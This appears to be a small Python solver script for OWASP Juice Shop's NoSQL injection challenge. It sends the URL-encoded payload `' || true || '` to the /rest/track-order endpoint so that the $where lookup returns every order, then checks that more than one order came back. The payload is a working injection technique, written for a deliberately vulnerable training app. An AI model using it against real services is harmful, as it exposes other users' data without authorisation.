"""NoSQL injection in the $where clause of routes/trackOrder.ts.

Same payload as Juice Shop's own API test ("GET all orders by injecting into
orderId", test/api/track-result.test.ts). Success: the response lists more than
one order, i.e. the injected `|| true` turned the lookup into "every order"
(the solve condition of noSqlOrdersChallenge).
"""

import json
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    with urllib.request.urlopen(f"{base}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27") as res:
        orders = json.load(res).get("data", [])
    return len(orders) > 1, f"{len(orders)} orders returned"
